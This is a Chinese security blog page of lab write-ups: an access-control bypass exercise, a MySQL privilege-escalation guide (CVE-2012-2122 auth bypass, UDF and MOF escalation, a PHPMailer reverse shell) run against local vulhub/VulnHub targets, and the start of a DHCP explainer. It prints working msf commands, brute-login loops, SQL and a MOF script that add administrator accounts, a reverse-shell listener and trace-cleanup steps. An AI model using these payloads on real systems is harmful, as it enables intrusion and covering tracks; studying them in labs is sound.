<h2 id="靶场练习："><a href="#靶场练习：" class="headerlink" title="靶场练习："></a>靶场练习：</h2><p>当我们以lucy身份登陆进系统时，可以看到username参数可控，当我们改成其他用户时，可以看到其他用户的个人信息。这属于水平越权。</p>
<p><img src="/2021/04/22/Broken-Access-Contro/1.jpg"></p>
<p><img src="/2021/04/22/Broken-Access-Contro/2.jpg"></p>
<p>接下来看看垂直越权,由于后台处理数据的逻辑存在漏洞,对于发送的数据包并没有判断当前数据包的用户权限,所以存在越权漏洞,具体看代码:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$link</span>=connect();</span><br><span class="line"><span class="comment">// 判断是否登录，没有登录不能访问</span></span><br><span class="line"><span class="comment">//这里只是验证了登录状态，并没有验证级别，所以存在越权问题。</span></span><br><span class="line"><span class="keyword">if</span>(!check_op2_login(<span class="variable">$link</span>))&#123;</span><br><span class="line">    header(<span class="string">&quot;location:op2_login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]!=<span class="literal">null</span> &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]!=<span class="literal">null</span>)&#123;<span class="comment">//用户名密码必填</span></span><br><span class="line">        <span class="variable">$getdata</span>=escape(<span class="variable">$link</span>, <span class="variable">$_POST</span>);<span class="comment">//转义</span></span><br><span class="line">        <span class="variable">$query</span>=<span class="string">&quot;insert into member(username,pw,sex,phonenum,email,address) values(&#x27;<span class="subst">&#123;$getdata[&#x27;username&#x27;]&#125;</span>&#x27;,md5(&#x27;<span class="subst">&#123;$getdata[&#x27;password&#x27;]&#125;</span>&#x27;),&#x27;<span class="subst">&#123;$getdata[&#x27;sex&#x27;]&#125;</span>&#x27;,&#x27;<span class="subst">&#123;$getdata[&#x27;phonenum&#x27;]&#125;</span>&#x27;,&#x27;<span class="subst">&#123;$getdata[&#x27;email&#x27;]&#125;</span>&#x27;,&#x27;<span class="subst">&#123;$getdata[&#x27;address&#x27;]&#125;</span>&#x27;)&quot;</span>;</span><br><span class="line">        <span class="variable">$result</span>=execute(<span class="variable">$link</span>, <span class="variable">$query</span>);</span><br><span class="line">        <span class="keyword">if</span>(mysqli_affected_rows(<span class="variable">$link</span>)==<span class="number">1</span>)&#123;<span class="comment">//判断是否插入</span></span><br><span class="line">            header(<span class="string">&quot;location:op2_admin.php&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$html</span>.=<span class="string">&quot;&lt;p&gt;修改失败,请检查下数据库是不是还是活着的&lt;/p&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先登录admin账户创建test1用户,此时抓包.并发送到repeater模块</p>
<p>然后登陆普通用户pikachu,获取普通用户的cookie.</p>
<p>用此cookie覆盖之前admin用户的cookie,重放数据包,发现用户swanQ成功创建.</p>
<p><img src="/2021/04/22/Broken-Access-Contro/3.jpg"></p>
<p><img src="/2021/04/22/Broken-Access-Contro/4.jpg"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这句话很有道理：</p>
<p>水平越权相当于用别人的卡，而垂直越权相当于用低价购买奢侈品。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/04/15/MYSQL%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/author.jpg">
      <meta itemprop="name" content="swanQ">
      <meta itemprop="description" content="Try & Enjoy">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="SwanQ's Blue SKY">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/04/15/MYSQL%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/" class="post-title-link" itemprop="url">MYSQL提权总结</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-04-15 20:10:49" itemprop="dateCreated datePublished" datetime="2021-04-15T20:10:49+08:00">2021-04-15</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-04-27 21:33:43" itemprop="dateModified" datetime="2021-04-27T21:33:43+08:00">2021-04-27</time>
              </span>

          
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>5.9k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>5 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="0x01-MYSQL漏洞案例："><a href="#0x01-MYSQL漏洞案例：" class="headerlink" title="0x01 MYSQL漏洞案例："></a>0x01 MYSQL漏洞案例：</h1><p>先通过MYSQL身份认证绕过漏洞 CVE-2012-2122开始看起。</p>
<h2 id="1-漏洞原理："><a href="#1-漏洞原理：" class="headerlink" title="1. 漏洞原理："></a>1. 漏洞原理：</h2><p>该漏洞是身份认证绕过漏洞，当连接MariaDB/MySQL时，输入的密码会与期望的正确密码比较，由于处理不正确，会导致memcmp()返回一个非零值，也会使MySQL认为两个密码是相同的。即只要知道用户名，不断尝试就能够直接登入SQL数据库。</p>
<h2 id="2-影响版本："><a href="#2-影响版本：" class="headerlink" title="2. 影响版本："></a>2. 影响版本：</h2><p>Mariadb、Mysql：几乎影响5.1至5.5的所有版本，包括5.1.61，5.0.11，5.3.5，5.5.22，5.5.23</p>
<h2 id="3-漏洞复现："><a href="#3-漏洞复现：" class="headerlink" title="3. 漏洞复现："></a>3. 漏洞复现：</h2><p>靶机：Ubuntu 192.168.127.131</p>
<p>攻击机：kali 192.168.127.130</p>
<p>环境：docker  vulhub</p>
<blockquote>
<p>注：</p>
<p>[1]除了安装docker-ce docker-io之外，可能需要安装docker-compose</p>
<p>[2]docker-compose是docker的命令行工具，docker-compose up启动并运行vulhub中的mysql服务。</p>
<p>[3]进入docker：docker exec -it 69d1 bash</p>
</blockquote>
<p> <img src="/2021/04/15/MYSQL%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/1.png" alt="img"></p>
<p><img src="/2021/04/15/MYSQL%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2.png" alt="img"></p>
<p>环境启动后，将启动一个Mysql服务（版本：5.5.23），监听3306端口，通过Mysql客户端可直接登录，其root密码是123456。至此靶机环境搭建完成</p>
<p>攻击机扫描靶机所开放服务：</p>
<p><img src="/2021/04/15/MYSQL%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/3.png" alt="img"></p>
<p>可看到linux服务器开启了mysql，版本为5.5.23</p>
<h3 id="方法一、用msf直接跑："><a href="#方法一、用msf直接跑：" class="headerlink" title="方法一、用msf直接跑："></a>方法一、用msf直接跑：</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">search mysql</span><br><span class="line">use auxiliary/scanner/mysql/mysql_authbypass_hashdump</span><br><span class="line">set RHOSTS 192.168.127.131</span><br><span class="line">set threads 10</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p><img src="/2021/04/15/MYSQL%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/4.png" alt="img"></p>
<p>可以看到密码的哈希值，一般密码以MD5的格式</p>
<blockquote>
<p>注：</p>
<p>[1] MD5加密结果是128位二进制，也就是32位十六进制数</p>
<p>[2] SHA-1加密结果是160位二进制，也就是40位十六进制数</p>
<p>[3] SHA-256加密结果是256位二进制，也就是64位十六进制数</p>
<p>[4] SHA-512加密结果是512位二进制，也就是128位十六进制数</p>
<p>[5] RIPEMD160加密结果是160位二进制，也就是40位十六进制数</p>
</blockquote>
<p><img src="/2021/04/15/MYSQL%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/5.png" alt="img"></p>
<p>MD5解密</p>
<p><img src="/2021/04/15/MYSQL%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/6.png" alt="img"></p>
<h3 id="方法二、利用bash脚本自动登陆mysql数据库"><a href="#方法二、利用bash脚本自动登陆mysql数据库" class="headerlink" title="方法二、利用bash脚本自动登陆mysql数据库"></a>方法二、利用bash脚本自动登陆mysql数据库</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 用一个错误的密码登录1000次目标主机的mysql数据库</span></span><br><span class="line">for ((i = 1; i &lt; 1000; i++)) </span><br><span class="line">do</span><br><span class="line">        echo &quot;= = = = = = = = = = = = = = = = = = = = = = = = = = = = =&quot;;</span><br><span class="line">        mysql -h 192.168.127.131 -u root -p111111 -P 3306;</span><br><span class="line">        echo &quot;= = = = = = = = = = = = = = = = = = = = = = = = = = = = =&quot;;</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<p><img src="/2021/04/15/MYSQL%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/7.jpg" alt="img"></p>
<p><img src="/2021/04/15/MYSQL%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/8.jpg" alt="img"></p>
<h3 id="方法三、Python脚本："><a href="#方法三、Python脚本：" class="headerlink" title="方法三、Python脚本："></a>方法三、Python脚本：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#！/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">subprocess.Popen(<span class="string">&quot;mysql -u root -P 3306 -h 192.168.127.131 --password=aaaaa&quot;</span>, shell=<span class="literal">True</span>).wait()</span><br></pre></td></tr></table></figure>

<p><img src="/2021/04/15/MYSQL%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/9.jpg" alt="img"></p>
<p>todo:看看mysql 5.5.23的paswword.c出问题的具体位置。</p>
<h1 id="0x02-UDF-提权"><a href="#0x02-UDF-提权" class="headerlink" title="0x02 UDF 提权"></a>0x02 UDF 提权</h1><p>UDF（user defined function）用户自定义函数。用户可以通过自己增加函数对mysql功能进行扩充。</p>
<p>通过添加UDF导出dll，再mysql中使用UDF以高权限账号执行命令，添加账号进行提权</p>
<h2 id="1-提权条件："><a href="#1-提权条件：" class="headerlink" title="1.提权条件："></a>1.提权条件：</h2><ul>
<li>知道mysql数据库的账户，有对mysql的insert和delete权限，以创建和抛弃函数。</li>
<li>有可以将动态链接库udf.dll写入相应目录的权限。</li>
</ul>
<h2 id="2-相关知识点"><a href="#2-相关知识点" class="headerlink" title="2.相关知识点"></a>2.相关知识点</h2><h3 id="1-Secure-file-priv参数"><a href="#1-Secure-file-priv参数" class="headerlink" title="1. Secure_file_priv参数"></a>1. Secure_file_priv参数</h3><p>secure-file-priv参数是用来限制LOAD DATA,SELEC,OUTFILE, LOAD_FILE()传递的指定目录</p>
<ul>
<li>值为null ：限制mysql不允许导入导出</li>
<li>值为/tmp/ ：限制mysql的导入导出只能发生在/tmp/目录</li>
<li>没有具体值：对mysql的导入导出不做限制</li>
</ul>
<p>通过执行<code>SHOW VARIABLES LIKE &quot;secure_file_priv&quot;;</code>查看secure-file-priv的状态。</p>
<h3 id="2-UDF来源"><a href="#2-UDF来源" class="headerlink" title="2.UDF来源"></a>2.UDF来源</h3><p>sqlmap和metasploit中有windows和Linux32和64位的UDF文件，需要先用sqlmap自带解码工具cloak.py对进行异或的UDF文件进行解码:</p>
<p><img src="/2021/04/15/MYSQL%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/7.png"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">路径：</span><br><span class="line"></span><br><span class="line">&#x2F;usr&#x2F;share&#x2F;sqlmap&#x2F;data&#x2F;udf&#x2F;mysql&#x2F;windows&#x2F;63&#x2F;lib_mysqludf_sys.dll_</span><br><span class="line"></span><br><span class="line">&#x2F;usr&#x2F;share&#x2F;sqlmap&#x2F;extra&#x2F;cloak&#x2F;cloak.py</span><br></pre></td></tr></table></figure>

<p>metasploit的UDF动态链接库文件无需解码，路径如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usr/share/metasploit-framework/embedded/framework/data/exploits/mysql</span><br></pre></td></tr></table></figure>

<h3 id="3-UDF提供的函数"><a href="#3-UDF提供的函数" class="headerlink" title="3.UDF提供的函数"></a>3.UDF提供的函数</h3><p>hexdump -C lib_mysqludf_sys_64.so | tail -n +118 | head -n 35</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sys_eval，执行任意命令，并将输出返回。</span><br><span class="line">sys_exec，执行任意命令，并将退出码返回。</span><br><span class="line">sys_get，获取一个环境变量。</span><br><span class="line">sys_set，创建或修改一个环境变量。</span><br></pre></td></tr></table></figure>

<p>此时已经有了udf文件，接下来就要上传到网站的指定目录</p>
<ul>
<li>当mysql &lt; 5.0，导出路径随意。</li>
<li>当5.0 &lt;= mysql &lt; 5.1，udf.dll 则需要导出至目标服务器的系统目录 (如：c:/windows/system32/)</li>
<li>当mysql &gt; 5.1，要把udf.dll文件放到MySQL安装目录下的lib\plugin文件夹下才能创建自定义函数</li>
</ul>
<p>接下来就是寻找插件目录并写入动态链接库：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--查询软件安装目录</span></span><br><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%plugin%&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- sys_eval是函数名称，udf.dll是lib_mysqludf_sys.dll_上传后的文件名</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">function</span> sys_eval <span class="keyword">returns</span> string soname <span class="string">&#x27;udf.dll&#x27;</span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">--查看 mysql 函数里是否新增sys_eval</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> mysql.func;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 执行系统命令试试</span></span><br><span class="line"><span class="keyword">select</span> sys_eval(<span class="string">&#x27;whoami&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 将swanQ加入管理员组</span></span><br><span class="line"><span class="keyword">select</span> cmdshell(<span class="string">&#x27;net user swanQ swanQ/add&#x27;</span>); </span><br><span class="line"><span class="keyword">select</span> cmdshell(<span class="string">&#x27;net localgroup administrators swanQ/add&#x27;</span>);   </span><br><span class="line"></span><br><span class="line"><span class="comment">-- 清除痕迹:删除函数</span></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">function</span> cmdshell;</span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> mysql.func <span class="keyword">where</span> name<span class="operator">=</span><span class="string">&#x27;cmdshell&#x27;</span>  </span><br></pre></td></tr></table></figure>



<h2 id="3-漏洞复现：PHPMailer命令执行利用"><a href="#3-漏洞复现：PHPMailer命令执行利用" class="headerlink" title="3.漏洞复现：PHPMailer命令执行利用"></a>3.漏洞复现：PHPMailer命令执行利用</h2><h3 id="001-环境搭建"><a href="#001-环境搭建" class="headerlink" title="001 环境搭建"></a>001 环境搭建</h3><p><a target="_blank" rel="noopener" href="https://download.vulnhub.com/raven/Raven2.ova">靶机下载</a></p>
<p>攻击机：kali 192.168.127.130</p>
<p>靶机：Raven 192.168.127.129</p>
<p>靶机开放了SSH22端口、80和111端口。访问靶机的80端口可查看wordpress博客页面，dirb跑一下目录。发现phpmailer，并查看版本信息，发现存在php命令执行漏洞。找到靶机发邮件的位置contact.php。</p>
<p><img src="/2021/04/15/MYSQL%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/10.jpg"></p>
<p><img src="/2021/04/15/MYSQL%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/11.jpg"></p>
<p><img src="/2021/04/15/MYSQL%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/8.png"></p>
<p><img src="/2021/04/15/MYSQL%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/12.jpg"></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">searchsploit phpmailer</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 定位exp位置</span></span><br><span class="line">locate exploits/php/webapps/40974.py</span><br></pre></td></tr></table></figure>

<p>更改参数后，运行代码，此时目录下会生成back.php</p>
<p><img src="/2021/04/15/MYSQL%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/14.jpg"></p>
<p><img src="/2021/04/15/MYSQL%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/13.jpg"></p>
<p>开启本地监听，back.php文件运行后shell会成功反弹。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 监听端口</span></span><br><span class="line">nc -lvnp 6666</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 得到交互式shell:</span></span><br><span class="line">python -c ’import pty; pty.spawn(&quot;/bin/bash&quot;)’</span><br></pre></td></tr></table></figure>

<h1 id="0x03-MOF提权"><a href="#0x03-MOF提权" class="headerlink" title="0x03 MOF提权"></a>0x03 MOF提权</h1><h3 id="1-原理"><a href="#1-原理" class="headerlink" title="1.原理"></a>1.原理</h3><p>MOF(托管对象格式)是windows系统C:/Windows/system32/wbem/mof/nullevt.mof文件，其作用是每间隔5秒就监听进程的创建和死亡。</p>
<p>如果通过mysql使用load_file将文件写入/wbom/mof。mof中有vbs脚本，可以通过控制脚本内容让系统执行命令来提权。</p>
<h3 id="2-条件"><a href="#2-条件" class="headerlink" title="2.条件"></a>2.条件</h3><ul>
<li><p>windows03及以下版本</p>
</li>
<li><p>mysql有读写C:/Windows/system32/wbem/mof的权限</p>
</li>
<li><p>secure-file-priv参数不为null</p>
</li>
</ul>
<p>msf也自带mof提权模块，且可自动清理痕迹</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/mysql/mysql_mof</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置payload</span></span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置目标 MySQL 的基础信息</span></span><br><span class="line"><span class="built_in">set</span> rhosts 192.168.127.132</span><br><span class="line"><span class="built_in">set</span> username root</span><br><span class="line"><span class="built_in">set</span> password root</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>mof脚本内容：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#pragma namespace(&quot;\\\\.\\root\\subscription&quot;) </span><br><span class="line"></span><br><span class="line">instance of __EventFilter as $EventFilter </span><br><span class="line">&#123; </span><br><span class="line">    EventNamespace &#x3D; &quot;Root\\Cimv2&quot;; </span><br><span class="line">    Name  &#x3D; &quot;filtP2&quot;; </span><br><span class="line">    Query &#x3D; &quot;Select * From __InstanceModificationEvent &quot; </span><br><span class="line">            &quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot; </span><br><span class="line">            &quot;And TargetInstance.Second &#x3D; 5&quot;; </span><br><span class="line">    QueryLanguage &#x3D; &quot;WQL&quot;; </span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer </span><br><span class="line">&#123; </span><br><span class="line">    Name &#x3D; &quot;consPCSV2&quot;; </span><br><span class="line">    ScriptingEngine &#x3D; &quot;JScript&quot;; </span><br><span class="line">    ScriptText &#x3D; </span><br><span class="line">&quot;var WSH &#x3D; new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user hacker P@ssw0rd &#x2F;add\&quot;)\nWSH.run(\&quot;net.exe localgroup administrators hacker &#x2F;add\&quot;)&quot;; </span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line">instance of __FilterToConsumerBinding </span><br><span class="line">&#123; </span><br><span class="line">    Consumer   &#x3D; $Consumer; </span><br><span class="line">    Filter &#x3D; $EventFilter; </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>其中核心payload为：</p>
<figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var WSH = <span class="keyword">new</span> ActiveXObject(\<span class="string">&quot;WScript.Shell\&quot;</span>)\nWSH.run(\<span class="string">&quot;net.exe user hacker P@ssw0rd /add\&quot;</span>)\nWSH.run(\<span class="string">&quot;net.exe localgroup administrators hacker /add\&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>将test.mof写入mof目录下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql &gt; select load_file(&#39;C:&#x2F;Documents and Settings&#x2F;test.mof&#39;)into dumpfile &quot;C:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;test.mof&quot;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>执行成功test.mof 会出现在：c:/windows/system32/wbem/goog/ 目录下 ,否则在 c:/windows/system32/wbem/bad 目录下</p>
<p>痕迹清理：</p>
<p>每隔几分钟会重新执行添加用户的命令，所以想清理痕迹得先暂时关闭 winmgmt 服务再删除mof 文件，此时删除用户才有效果。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 停止 winmgmt 服务</span></span><br><span class="line">net stop winmgmt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除 Repository 文件夹</span></span><br><span class="line"><span class="built_in">rmdir</span> /s /q C:\Windows\system32\wbem\Repository\</span><br><span class="line"></span><br><span class="line"><span class="comment"># 手动删除 mof 文件</span></span><br><span class="line"><span class="built_in">del</span> C:\Windows\system32\wbem\mof\good\test.mof /F /S</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除创建的用户</span></span><br><span class="line">net user hacker /delete</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重新启动服务</span></span><br><span class="line">net <span class="built_in">start</span> winmgmt</span><br></pre></td></tr></table></figure>



<h1 id="0x04-漏洞修复："><a href="#0x04-漏洞修复：" class="headerlink" title="0x04 漏洞修复："></a>0x04 漏洞修复：</h1><p>MySQL数据库更新到最新版本<br>禁止除白名单外其他ip远程登录MySQL数据库<br>修改数据库用户名</p>
<p>思考：</p>
<p>记得是python3跑脚本，不然会遇到python包已安装，但还是找不到的问题。Linux权限管理比Winodws严格，Linux分root用户，组用户和其他用户，然而windows就只有user和administrator。</p>
<p>参考：</p>
<p><a target="_blank" rel="noopener" href="https://my.oschina.net/bylibrary/blog/4967585">https://my.oschina.net/bylibrary/blog/4967585</a></p>
<p><a target="_blank" rel="noopener" href="https://yeasy.gitbook.io/docker_practice/container">https://yeasy.gitbook.io/docker_practice/container</a></p>
<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/a4f25b2d74e6">https://www.jianshu.com/p/a4f25b2d74e6</a> </p>
<p><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub">https://github.com/vulhub/vulhub</a> </p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/yatere/article/details/7654057">https://blog.csdn.net/yatere/article/details/7654057</a></p>
<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/15321f9ede38">https://www.jianshu.com/p/15321f9ede38</a></p>
<p><a target="_blank" rel="noopener" href="https://www.xiaoheidiannao.com/8682.html">https://www.xiaoheidiannao.com/8682.html</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/04/15/2021-04-15/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/author.jpg">
      <meta itemprop="name" content="swanQ">
      <meta itemprop="description" content="Try & Enjoy">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="SwanQ's Blue SKY">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/04/15/2021-04-15/" class="post-title-link" itemprop="url">一篇文章搞懂所有协议</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2021-04-15 15:23:58 / 修改时间：15:44:59" itemprop="dateCreated datePublished" datetime="2021-04-15T15:23:58+08:00">2021-04-15</time>
            </span>

          
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>7.1k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>6 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="0x01-DHCP协议"><a href="#0x01-DHCP协议" class="headerlink" title="0x01 DHCP协议"></a>0x01 DHCP协议</h1><p><strong>局域网内分配ip</strong></p>
<p><strong>一、动态主机配置协议DHCP</strong></p>
<p><strong>1.DHCP简介</strong></p>
<p>​        DHCP(Dynamic Host Configuration Protocol),动态主机配置协议，是一个应用层协议。当我们将客户主机ip地址设置为动态获取方式时，DHCP服务器就会根据DHCP协议给客户端分配IP，使得客户机能够利用这个IP上网。</p>
